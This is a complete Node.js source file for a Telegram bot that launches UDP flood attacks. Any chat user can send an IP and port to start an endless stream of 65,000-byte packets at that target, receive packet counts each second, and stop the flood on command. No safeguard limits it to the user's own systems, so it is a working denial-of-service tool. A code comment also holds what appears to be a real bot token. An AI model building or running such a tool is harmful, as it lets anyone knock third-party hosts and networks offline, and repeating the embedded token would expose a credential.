const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');

// Replace '6725616382:AAFThqEKrBdWBNvomNBucwvoH2GmSC2Zx90' with the token you get from BotFather
const token = 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(token, { polling: true });

let floodInstances = {};

// Function to perform UDP flood
const udpFlood = (chatId, host, port) => {
  const client = dgram.createSocket('udp4');
  const message = Buffer.alloc(65000, 'X');
  let packets = 0;
  let floodActive = true;

  // Function to send packets
  const sendPacket = () => {
    if (!floodActive) return;
    packets++;
    client.send(message, 0, message.length, port, host, (err) => {
      if (err) {
        console.error(`Error: ${err.message}`);
      }
      sendPacket();
    });
  };

  // Start sending packets
  sendPacket();

  // Update user every second with the current packet count
  const updateInterval = setInterval(() => {
    if (!floodActive) {
      clearInterval(updateInterval);
    } else {
      bot.sendMessage(chatId, `Packets sent: ${packets}`);
    }
  }, 1000);

  // Save instance information for stopping
  floodInstances[chatId] = () => {
    floodActive = false;
    client.close();
    bot.sendMessage(chatId, `UDP Flood stopped. Total packets sent: ${packets}`);
  };
};

// Handler for the /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Welcome to the UDP Flood Bot. Send /udp <IP> <port> to start the flood. Use /stop to end the flood.');
});

// Handler for the /udp command with parameters
bot.onText(/\/udp (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const host = match[1];
  const port = parseInt(match[2], 10);

  if (!host || isNaN(port) || port <= 0 || port > 65535) {
    bot.sendMessage(chatId, 'Invalid parameters. Usage: /udp <IP> <port>');
    return;
  }

  bot.sendMessage(chatId, `Starting UDP flood on ${host} on port ${port}. Use /stop to end the flood.`);
  udpFlood(chatId, host, port);
});

// Handler for the /stop command
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (floodInstances[chatId]) {
    floodInstances[chatId]();
    delete floodInstances[chatId];
  } else {
    bot.sendMessage(chatId, 'No active UDP flood to stop.');
  }
});
